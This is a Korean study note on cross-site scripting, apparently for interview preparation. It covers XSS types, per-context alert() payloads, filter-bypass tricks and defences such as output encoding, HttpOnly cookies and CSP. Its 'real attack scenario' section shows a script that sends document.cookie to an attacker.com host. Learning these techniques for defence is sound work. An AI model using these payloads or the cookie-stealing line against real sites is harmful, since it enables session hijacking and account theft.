XSS (Cross-Site Scripting) 기초

사용자 입력값이 응답에 그대로 노출되어 JavaScript로 실행되는 취약점

XSS 개요​

항목내용
정의사용자 입력값이 응답에 그대로 반영되어 브라우저에서 JavaScript로 실행되는 취약점
핵심스크립트를 상대방에게 실행시킬 수 있기만 하면 무조건 XSS
주의alert()은 PoC(개념 증명)일 뿐, 실제 공격에서는 사용하지 않음

XSS 유형​

유형설명특징
Reflected XSS입력값이 즉시 응답에 반영됨URL 파라미터를 통해 전달, 피해자가 링크를 클릭해야 실행됨
Stored XSS입력값이 DB에 저장된 후 다른 사용자에게 노출됨지속적으로 실행, 파급력 가장 큼, 게시판·댓글 등에서 발생
DOM-based XSS서버 응답이 아닌 클라이언트 DOM 조작으로 발생서버 로그에 남지 않아 탐지 어려움, document.location 등 사용

XSS로 가능한 공격​

공격 유형설명
세션 하이재킹document.cookie를 탈취하여 계정 탈취
피싱가짜 로그인 페이지 삽입 또는 리다이렉트
키로깅이벤트 핸들러로 키보드 입력 수집
암호화폐 채굴피해자 브라우저 자원을 이용한 채굴 스크립트 실행
악성코드 배포Drive-by Download 등 악성 파일 다운로드 유도

XSS 공격 절차​

  1. 파라미터가 응답에 그대로 노출되는지 확인
  2. 입력값이 노출되는 위치 파악 (태그 사이 / 속성값 / JavaScript 내부)
  3. 필요한 특수문자 확인: < > " ' ( ) / ; 등
  4. 특수문자 치환 여부 확인 (HTML Entity 변환 여부)
  5. 테스트 구문으로 alert 실행 확인
  6. 실제 공격 구문 작성

기본 공격 구문​

<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<svg onload=alert('XSS')>

이벤트 핸들러 활용​

이벤트 핸들러발생 조건자동 실행 가능 여부
onerror리소스 로드 실패 시가능 (src=x 등 잘못된 경로 사용)
onload요소 로드 완료 시가능 (<body>, <svg>, <iframe> 등)
onfocus요소에 포커스 시autofocus 속성 사용 시 자동 가능
onmouseover마우스 오버 시사용자 상호작용 필요
onclick클릭 시사용자 상호작용 필요

핵심: 실제 공격 구문은 자동 실행되어야 한다

<img src=x onerror=alert('XSS') style="display:none">

위치별 공격 전략​

Case 1: 태그 사이 (<div>USER_INPUT</div>)​

입력값이 HTML 태그 콘텐츠로 노출되는 경우

<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">

Case 2: 속성값 내부 (<input value="USER_INPUT">)​

입력값이 HTML 속성 값으로 노출되는 경우

test" onfocus="alert('XSS')
test"><script>alert('XSS')</script><input value="

Case 3: JavaScript 내부 (var x = "USER_INPUT";)​

입력값이 JavaScript 코드 내부에 반영되는 경우

test"; alert('XSS'); var a="

함수 내부 탈출 예시:

test"); alert('XSS'); //

필터 우회 기법​

문자열 이중 삽입​

필터가 <script>를 단순 제거하는 경우 활용

<scrscriptipt>alert('XSS')</scrscriptipt>

필터 제거 후 → <script>alert('XSS')</script>

대소문자 혼용​

대소문자를 구분하는 필터 우회

<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x OnErRoR=alert('XSS')>

인코딩 활용​

인코딩 방식예시
URL 인코딩%3Cscript%3E
HTML 엔티티&#60;script&#62;
유니코드\u003cscript\u003e

태그/속성 변형​

<script> 없이 실행 가능한 다양한 태그와 이벤트 핸들러

<svg onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<video onloadstart=alert('XSS') src=x>
<details ontoggle=alert('XSS') open>
<marquee onstart=alert('XSS')>

XSS 방어 기법​

입력값 검증 위치​

검증 위치장점단점
클라이언트 측UX 즉각적 피드백우회 가능, 보안 의존 불가
서버 입력 시악성 데이터 저장 차단저장 형식 유연성 감소
서버 출력 시렌더링 컨텍스트 인식 가능처리 누락 시 취약

권장: 출력 시 인코딩 (Output Encoding) 기본 적용 + 입력 시 검증 보조

출력 인코딩 (HTML Entity)​

원문자인코딩
<&lt;
>&gt;
"&quot;
'&#x27;
&&amp;

화이트리스트 vs 블랙리스트​

방식설명장점단점
블랙리스트알려진 악성 패턴 차단구현 쉬움우회 기법에 취약, 완벽한 목록 유지 어려움
화이트리스트허용된 패턴만 통과우회 어려움, 강력한 보안구현 복잡, 정상 입력 차단 가능성

권장: 화이트리스트 기반 검증 + 출력 인코딩 조합

HTTP Only 쿠키​

JavaScript에서 쿠키 접근 자체를 차단

Set-Cookie: session=abc123; HttpOnly

XSS가 성공해도 document.cookie로 세션 탈취 불가

CSP (Content Security Policy)​

허용된 출처의 스크립트만 실행 허용

Content-Security-Policy: script-src 'self'

인라인 스크립트 및 외부 스크립트 실행 제한

실제 공격 시나리오​

쿠키를 공격자 서버로 전송​

<script>
new Image().src="https://attacker.com/steal?cookie="+document.cookie;
</script>

피해자가 해당 페이지 방문 시 쿠키가 공격자 서버 로그에 기록됨

면접 대비 포인트​

  • alert을 막는다고 XSS가 해결된 것이 아님 → 스크립트 실행 자체를 막아야 함
  • XSS로 가능한 공격: 세션 탈취, 피싱, 키로깅, 암호화폐 채굴, 악성코드 배포
  • Stored / Reflected / DOM-based XSS의 차이점과 각각의 탐지·방어 방법
  • HttpOnly 쿠키와 CSP의 역할과 한계

트러블슈팅 체크리스트​

  • 입력값이 응답에 그대로 노출되는 파라미터 찾기
  • 노출 위치 파악 (태그 사이 / 속성값 / JavaScript 내부)
  • 필요한 특수문자(<, >, ", ' 등) 치환 여부 확인
  • 공격 구문 작성 시 자동 실행 여부 확인
  • 필터링 있을 시 우회 기법 적용 (이중 삽입, 대소문자 혼용, 인코딩 등)
  • HttpOnly, CSP 설정 여부 확인
